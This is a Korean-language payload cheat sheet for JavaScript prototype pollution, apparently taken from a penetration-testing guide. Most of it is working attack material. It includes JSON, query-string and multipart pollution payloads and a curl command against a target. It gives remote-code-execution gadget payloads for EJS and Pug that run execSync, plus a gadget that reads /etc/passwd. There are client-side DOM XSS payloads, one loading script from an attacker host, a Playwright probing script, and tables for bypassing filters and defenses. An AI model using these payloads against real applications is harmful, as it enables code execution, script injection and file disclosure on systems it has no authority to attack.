### 기본 페이로드

**서버 sink — JSON body:**
```json
{"__proto__":{"polluted":"yes"}}
{"constructor":{"prototype":{"polluted":"yes"}}}
{"__proto__":{"polluted":"yes"},"constructor":{"prototype":{"polluted2":"yes"}}}
```

**서버 sink — Query string (qs `extended:true`):**
```
?__proto__[polluted]=yes
?constructor[prototype][polluted]=yes
?__proto__.polluted=yes
?a[__proto__][polluted]=yes
```

**서버 sink — multipart/urlencoded** (`INPUT_PARSER` 라벨):
```
# multer/formidable/koa-body가 __proto__ 키 reconstruct
curl -X POST "https://target/upload" -F "__proto__[polluted]=yes" -F "file=@x.txt"
```

**오염 확인:**
```
# 오염 후 다른 endpoint에서 빈 객체에 polluted 속성 존재 여부
GET /api/user/profile  → response에 "polluted":"yes" 포함 여부
GET /api/health        → 일반 endpoint 응답 변화 관찰
```

**가젯 활용 RCE** (`WITH_GADGET` 라벨):

| 가젯 | 페이로드 |
|---|---|
| EJS `outputFunctionName` | `{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');s"}}` + EJS 렌더 트리거 |
| Pug `compileDebug` | `{"__proto__":{"compileDebug":1,"self":1,"line":"process.mainModule.require('child_process').execSync('id')"}}` |
| Handlebars `lookup` | `{"__proto__":{"type":"Program","body":[{"type":"MustacheStatement",...}]}}` |
| `child_process.spawn` 옵션 | `{"__proto__":{"shell":"node","NODE_OPTIONS":"--require /tmp/x.js"}}` |
| jQuery `extend` 클라이언트 | `{"__proto__":{"src":"//attacker/xss.js"}}` (CSPP) + jQuery selector 트리거 |
| Express `res.render` 옵션 | `{"__proto__":{"layout":"/etc/passwd"}}` |

**클라이언트 CSPP (URL-based, Playwright):**
```javascript
const { chromium } = require('playwright');
(async () => {
  const b = await chromium.launch({ headless: true });
  const p = await b.newPage();
  for (const url of [
    'https://target/page#__proto__[polluted]=yes',
    'https://target/page?__proto__[polluted]=yes',
    'https://target/page?constructor[prototype][polluted]=yes',
    'https://target/page?__proto__.polluted=yes'
  ]) {
    await p.goto(url);
    const v = await p.evaluate(() => ({}).polluted);
    console.log(url, '=>', v);
  }
  await b.close();
})();
```

**CSPP + DOM XSS 가젯:**
```
https://target/page?__proto__[innerHTML]=<img src=x onerror=alert(1)>
https://target/page?__proto__[srcdoc]=<script>alert(1)</script>
https://target/page?__proto__[src]=//attacker/xss.js
```

**Class-based pollution (CVE-2022-21824, Node.js):**
```json
{"__proto__":{"hasOwnProperty":{"toString":"..."}}}
```

**Lodash CVE 체인 페이로드:**
- `_.merge({}, JSON.parse('{"__proto__":{"polluted":"yes"}}'))`
- `_.set({}, '__proto__.polluted', 'yes')`
- `_.setWith({}, '__proto__.polluted', 'yes', Object)`
- `_.zipObjectDeep(['__proto__.polluted'], ['yes'])`

---

### 우회 페이로드

| 방어 | 페이로드 |
|---|---|
| `__proto__` 키 차단 | `constructor.prototype.polluted=yes`, `constructor["prototype"]["polluted"]=yes`, `__proto__["polluted"]=yes` (대괄호 표기) |
| `hasOwnProperty` 체크 | 오염된 `hasOwnProperty` 자체 변조 — `Object.prototype.hasOwnProperty.call(obj, key)` 형태 아니면 우회 |
| `secure-json-parse` (JSON 한정) | multipart/urlencoded parser 별도 — 위 INPUT_PARSER 페이로드 |
| `Object.freeze(Object.prototype)` | 일부 라이브러리가 try/catch로 silent fail — 부분 오염 잔존 |
| Lodash 4.17.21+ | custom merge/set 함수에 동일 우회 — 라이브러리 업그레이드만으론 부족 |
| JSON Schema `additionalProperties: false` | 검증 후 다시 merge하는 코드 — 검증과 사용 시점 사이 재오염 |
| 키 화이트리스트 (allowed only) | dot notation `obj.allowedKey.injected=yes` — 중첩 객체로 우회 |
| Lodash `_.setWith` 차단 | `_.set`, `_.merge`, `_.defaultsDeep`, `_.zipObjectDeep` 다른 함수 |
| qs `prototypes: false` 옵션 | body parser는 별도 — Express 기본 `extended: true`는 여전 |

**Encoding 우회:**
```
# Unicode escape (JSON 파서 디코딩 후 통과)
{"\u005f\u005fproto\u005f\u005f":{"polluted":"yes"}}

# URL encoding double
?__proto__%5Bpolluted%5D=yes  →  ?__proto__[polluted]=yes
```

---

### 참고사항

- 서버 sink 식별이 어려우므로 가젯 식별이 핵심 — 코드에서 `child_process` 옵션, EJS `outputFunctionName`, jQuery selector 등 확인
- Express 4.x 기본 `qs` parser가 중첩 객체 생성 → query string으로도 오염 가능
- multer/formidable/busboy/koa-body는 `__proto__` 키 필터링 안 함 — 파일 업로드 폼이 오염 게이트
- CSPP는 jQuery/Bootstrap/AngularJS의 옵션 객체 missing 속성 lookup으로 DOM XSS 변형
- 오염 자체는 가능해도 가젯이 없으면 영향 없음 (`NO_GADGET` 라벨) — 후속 코드 변경으로 가젯 발생 가능
- 라이브러리 알려진 CVE 버전이라도 호출 경로 도달 불가하면 제외
- Class-based pollution (CVE-2022-21824)은 Node 16.17.0+ 패치 — console formatter 같은 우회는 더 깊은 가젯 필요
- `Object.create(null)` 사용 객체는 prototype chain 자체가 없어 오염 불가
- `Map`/`Set` 사용은 prototype lookup 없음 — 안전
- 오염 후 즉시 새 endpoint 호출하여 `polluted` 속성 반영 여부 확인 — 응답 본문 grep
- CSPP는 동일 페이지 내 jQuery/Vue 옵션 객체 lookup 시점에 트리거 — 페이지 로드 후 alert 발화 확인
- 가젯 페이로드는 application stack 의존 — Express+EJS, Express+Pug 등 조합별 다른 페이로드
- AST parser (esprima/acorn) 옵션 객체도 오염 게이트 — 파서 결과 조작 가능
